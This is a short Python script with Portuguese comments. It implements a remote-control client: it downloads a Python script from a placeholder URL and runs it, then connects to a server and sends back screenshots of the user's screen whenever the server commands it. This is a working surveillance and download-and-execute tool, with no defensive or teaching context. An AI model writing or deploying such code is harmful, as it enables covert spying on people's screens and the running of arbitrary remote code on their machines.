import socket
import io
import pyautogui
import urllib.request
import os
import subprocess

# Função para capturar a tela e enviar ao servidor
def send_screenshot(client):
    screenshot = pyautogui.screenshot()  # Captura a tela
    img_bytes = io.BytesIO()
    screenshot.save(img_bytes, format='PNG')  # Salva como PNG na memória
    img_data = img_bytes.getvalue()

    # Envia o tamanho da imagem primeiro
    client.sendall(len(img_data).to_bytes(4, 'big'))
    client.sendall(img_data)  # Envia a imagem
    print("Screenshot enviada.")

# Função para se conectar ao servidor
def connect_to_server():
    server_ip = '127.0.0.1'  # IP do servidor (ajuste conforme necessário)
    port = 12345

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((server_ip, port))

    print(f"Conectado ao servidor {server_ip} na porta {port}")

    while True:
        # Espera por comandos do servidor
        command = client.recv(1024).decode()
        if command == 'screenshot':
            send_screenshot(client)
        elif command == 'sair':
            print("Desconectando...")
            break

    client.close()

# Função para baixar e executar o script a partir de um link
def download_and_run_script(url):
    script_path = "client_script.py"
    urllib.request.urlretrieve(url, script_path)
    print(f"Script baixado de {url} e salvo como {script_path}.")
    
    # Executa o script
    subprocess.Popen(['python', script_path])
    print(f"Script {script_path} executado.")

if __name__ == "__main__":
    script_url = 'http://example.com/client_script.py'  # Substitua pelo link para o script Python
    download_and_run_script(script_url)
    connect_to_server()
